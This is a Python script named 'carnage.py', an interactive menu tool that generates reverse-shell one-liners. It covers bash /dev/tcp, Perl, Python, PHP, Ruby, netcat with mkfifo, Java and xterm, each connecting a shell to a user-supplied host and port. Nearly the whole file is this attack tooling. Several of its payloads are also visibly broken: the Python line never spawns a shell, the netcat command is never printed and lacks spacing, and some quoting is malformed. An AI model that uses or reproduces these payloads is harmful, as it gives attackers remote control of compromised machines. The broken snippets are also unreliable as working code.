#title           :carnage.py
#description     :Simple tool which can creat any type of reverse shell script code
#author          :Ishara Abeythissa
#date            :20191111
#version         :Python 3    
#usage           :python3 carnage.py
#!/usr/bin/python3
from time import sleep
import sys
import curses, os


def banner():
	line_1 = "Welcome to the carnage tool! Please refer the menu\n"
	for x in line_1:
    			print(x, end='')
    			sys.stdout.flush()
    			sleep(0.1)


def menu():
                banner()                
                print("[*] Reverse shell script menu")
                print("    [1] BASH script")
                print("    [2] PERL script")
                print("    [3] PYTHON script")
                print("    [4] PHP script")
                print("    [5] RUBY script")
                print("    [6] NETCAT script")
                print("    [7] JAVA script")
                print("    [8] XTERM script")
                choice = input("[*] Please select your choice => ")
                if choice == "1":
                    bash()
                if choice == "2":
                    perl()
                if choice == "3":
                    python()
                if choice == "4":
                    php()
                if choice == "5":
                    ruby()
                if choice == "6":
                    netcat()
                if choice == "7":
                    java()
                if choice == "8":
                    xterm()


def bash():
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                script = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
                print(script)

def perl():
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                script = "perl -e 'use Socket;$i="+ip+";$p="+port+"'"+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
                print(script)

def python():
	           print("/*** Special note this works only under python 2.7 versions")
	           ip = input("[*] Set LHOST: ")
	           port = input("[*] Set LPORT: ")
	           script = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ip+","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);"
	           print(script)

def php():
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                script = "php -r '$sock=fsockopen("+ip+","+port+");exec("+"/bin/sh -i <&3 >&3 2>&3"+");'"
                print(script)

def ruby():
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                script = "ruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'"
                print(script)

def netcat():
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                script = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" +ip+ ""+port+">/tmp/f"

def java():
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                script1 = "r = Runtime.getRuntime()"
                script2 = "p = r.exec(["+"/bin/bash","-c","exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5;"
                script3 = '"done"] as String[])"'
                script4 = 'p.waitFor()'
                print(script1)
                print(script2)
                print(script3)
                print(script4)

def xterm():
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                script = "xterm -display"+ip+":"+port+""
                print(script)

def main():
	           menu()

main()
                                                               


                                                                                                                        
